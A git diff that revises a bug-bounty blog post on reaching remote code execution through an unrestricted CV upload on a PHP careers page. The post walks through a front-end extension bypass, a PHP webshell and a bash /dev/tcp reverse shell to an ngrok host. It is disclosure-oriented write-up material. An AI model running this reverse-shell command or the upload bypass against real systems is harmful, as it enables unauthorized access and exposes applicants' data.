@@ -1,5 +1,5 @@
 ---
-title: "RCE via File Upload"
+title: "Remote Code Execution via File Upload"
 layout: post
 date: 2021-04-07 12:00
 tag:
@@ -7,67 +7,68 @@ tag:
 - Misconfiguration
 category: blog
 author: naveen
-description: Remote Code Execution Due to Unrestricted File Upload.
+description: Remote Code Execution due to Unrestricted File Upload.
 ---
 
-# Remote Code Execution
-Remote code execution (RCE) refers to the ability of a cyber attacker to access and make changes to a computer owned by another, without authority and regardless of where the computer is geographically located. RCE allows an attacker to take over a computer or a server by running arbitrary malicious software (malware).
+## Introduction
+Remote Code Execution (RCE) is a critical vulnerability that allows unauthorized individuals to access and modify a computer or server from a remote location. This capability enables attackers to run arbitrary malicious software, also known as malware, on the targeted system.
 
-Found a target using google dorks which having a responsible disclosure program. Let’s consider the target as abc.com the target website. During recon, I found that the target company owns 7 subdomains and each of them is integrated with the parent domain abc.com with some functionalities.
+## Identifying the Target
+During the reconnaissance phase, I utilized Google dorks to find a target that had a responsible disclosure program. For the purpose of this article, let's refer to the target website as abc.com. Further investigation revealed that the target company owned seven subdomains, all integrated with the parent domain abc.com and offering various functionalities.
 
-So I quickly started doing directory brute-forcing to figure out the directories and guess what the website is fully made up of PHP, so if I found a way to upload a php file I can get a reverse shell. The website having a career page which we can upload pdf file as a resume.
+## Exploiting PHP-Based Website
+Since the target website was predominantly built using PHP, I focused on finding a vulnerability that would allow me to upload a PHP file and gain a reverse shell. Interestingly, I discovered that the website had a career page where applicants could upload their resumes in PDF format.
 
-At the time of my recon, I found an uploads folder which contains all the uploaded documents of peoples who applied for jobs through this career page.
+### Directory Brute-Forcing
+To begin, I conducted a directory brute-forcing operation using the dirsearch tool. This enabled me to identify directories on the website and gain a better understanding of its structure.
 
-**Directory brute-forcing using dirsearch**
-![img](/assets/images/blogs/RCE1/1.webp)
+![Directory Brute-Forcing](/assets/images/blogs/RCE1/1.webp)
 
-**Index of uploaded files**
-![img](/assets/images/blogs/RCE1/2.webp)
+### Discovering Uploaded Files
+During my investigation, I came across an "uploads" folder that contained all the documents uploaded by individuals applying for jobs through the career page.
 
-So I quickly directed to the https://www.abc.com/careers.php careers page and checked the CV upload functionality but the application is validating the file extensions at the front end only.
+![Index of Uploaded Files](/assets/images/blogs/RCE1/2.webp)
 
-**validating file extension at frontend**
-![img](/assets/images/blogs/RCE1/3.webp)
+### Exploiting the CV Upload Functionality
+I proceeded to the career page URL (https://www.abc.com/careers.php) to examine the CV upload functionality. However, I found that the application only performed file extension validation at the front end, leaving room for potential exploitation.
 
-So I quickly downloaded the PHP webshell and uploaded successfully
+![Frontend File Extension Validation](/assets/images/blogs/RCE1/3.webp)
 
-![img](/assets/images/blogs/RCE1/4.webp)
+### Uploading the PHP Webshell
+Taking advantage of the lax file extension validation, I downloaded a PHP webshell and successfully uploaded it.
 
-All required information are filled and click submit then intercepted the request and changed the file extension from pdf to PHP
+![PHP Webshell Upload](/assets/images/blogs/RCE1/4.webp)
 
-**uploaded webshell**
-![img](/assets/images/blogs/RCE1/5.webp)
+### Activating the Webshell
+To trigger the PHP webshell, I accessed the location where the shell was uploaded.
 
-Then I quickly directed to the uploaded shell file location to trigger the PHP web shell.
+![Webshell Activation](/assets/images/blogs/RCE1/6.webp)
 
-**webshell**
-![img](/assets/images/blogs/RCE1/6.webp)
+### Expanding Control with Reverse Shell
+At this point, the webshell was functioning correctly. To establish a reverse shell, I either uploaded a reverse shell or used the following command in the web shell console to access the system via port forwarding using ngrok services.
 
-Finally, the webshell is working perfectly. To get a reverse shell we can upload the reverse shell instead of the webshell or we can simply use the below command on the web shell console to get access via port forwarding by using ngrok services.
+### PHP Webshell Repository
+For reference, you can find the PHP webshell I used in this demonstration on my GitHub repository: [GitHub Repo](https://github.com/thevillagehacker/Bug-Hunting/blob/main/Rev-shell/php_web_shell.php)
 
-### PHP webshell
-[GitHub Repo](https://github.com/thevillagehacker/Bug-Hunting/blob/main/Rev-shell/php_web_shell.php)
+## Obtaining a Reverse Shell
+To acquire a reverse shell, the following steps were performed:
 
-## Getting Reverse Shell
-- Enable port forwarding
-- Listen to forwarded port using Netcat
+1. Enabled port forwarding.
+2. Listened to the forwarded port using Netcat.
 
-**port forwarding setup using ngrok**
-![img](/assets/images/blogs/RCE1/7.webp)
+![Port Forwarding Setup with ngrok](/assets/images/blogs/RCE1/7.webp)
 
-Now the port forwarding is completed we can get the shell by executing the following command in the webshell input field
+With the completion of port forwarding setup, I executed the following command in the webshell input field:
 
 `bash -i >& /dev/tcp/0.tcp.ngrok.io/1000 0>&1`
 
-**execute reverse connection via bash**
+![Executing Reverse Connection via Bash](/assets/images/blogs/RCE1/8.webp)
 
-![img](/assets/images/blogs/RCE1/8.webp)
+As a result, a successful reverse shell connection was established.
 
-Now we got the reverse shell successfully.
+![Successful Reverse Shell](/assets/images/blogs/RCE1/9.webp)
 
-![img](/assets/images/blogs/RCE1/9.webp)
+## Conclusion
+In this article, I demonstrated how an unrestricted file upload vulnerability on a PHP-based website could lead to Remote Code Execution (RCE). By exploiting the website's lax file extension validation, I successfully uploaded a PHP webshell and obtained a reverse shell, ultimately gaining unauthorized access to the system. Thank you for reading.
 
-Thank you for reading.
-
-Follow me on Twitter : [thevillagehacker](https://twitter.com/thevillagehackr)
+For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).
